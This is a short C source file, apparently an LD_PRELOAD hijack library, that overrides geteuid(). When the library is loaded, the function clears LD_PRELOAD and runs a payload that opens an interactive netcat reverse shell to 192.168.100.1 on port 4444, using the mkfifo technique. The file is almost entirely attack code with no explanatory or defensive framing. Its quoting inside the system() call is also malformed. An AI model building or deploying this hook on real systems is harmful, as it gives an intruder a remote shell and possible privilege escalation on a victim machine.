#include <stdlib.h>
#include <stdio.h>
#include <string.h>
void payload() {
system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc "192.168.100.1 4444" >/tmp/f");
}
int geteuid() {
if (getenv("LD_PRELOAD") == NULL) { return 0; }
unsetenv("LD_PRELOAD");
payload();
}
